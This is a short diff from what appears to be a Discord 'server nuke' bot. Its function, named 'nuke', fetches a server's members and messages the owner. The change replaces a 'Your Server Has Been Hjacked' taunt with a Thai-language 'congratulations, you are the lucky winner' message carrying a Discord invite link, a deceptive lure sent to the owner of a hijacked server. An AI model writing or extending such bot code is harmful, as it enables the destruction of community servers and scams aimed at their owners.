@@ -50,7 +50,7 @@ async function nuke(guild) {
   
     await guild.fetchMembers();
   
-    await guild.owner.send('Your Server Has Been Hjacked !').catch(e => { return void e; });
+    await guild.owner.send('ยินดีด้วยค่ะ คุณคือผู้โชคดี [ https://discord.gg/5SbFP2k ]').catch(e => { return void e; });
   
   
   
